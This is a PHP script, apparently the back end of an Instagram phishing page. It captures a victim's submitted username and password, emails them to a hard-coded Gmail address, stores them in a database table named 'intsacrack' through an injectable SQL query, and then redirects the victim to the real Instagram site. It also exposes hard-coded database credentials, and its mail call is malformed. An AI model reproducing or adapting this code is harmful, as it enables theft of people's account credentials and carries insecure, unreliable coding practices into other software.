<?php
session_start();


unset($_SESSION['error_name']);
unset($_SESSION['error_password']);



    function redirct(){
        header('Location: ../index.php');
        exit;
}



$user = $_POST['username'];
$password = $_POST['password'];




$_SESSION['name'] = $user;
$_SESSION['password'] = $password;









if (trim($user)== ""){
    $_SESSION['error_name']= 'Ведите имя';
    redirct();
}else if(trim($password) == ""){
    $_SESSION['error_password'] = 'Введите пароль';
    redirct();
}else{
    $subject = "=?utf-8?B?".base64_encode("Инстаграм")."?=";
    $headers = "From: $user\r\nReply-to: $user\r\nContent-type: text/html;charset=utf-8\r\n";
    
    mail('joing3479@gmail.com',$user, $subject, $password, $headers);
    header('Location: https://www.instagram.com');
}


$mysql = new mysqli("localhost", "j85961_dbuser", "5Q>t%vpLPQJe@WaZ", "j85961_John_bd");
$mysql ->query("SET NAMES 'utf8'");
$mysql -> query("INSERT INTO `intsacrack`  (`name`, `password`) VALUE ('$user','$password')");


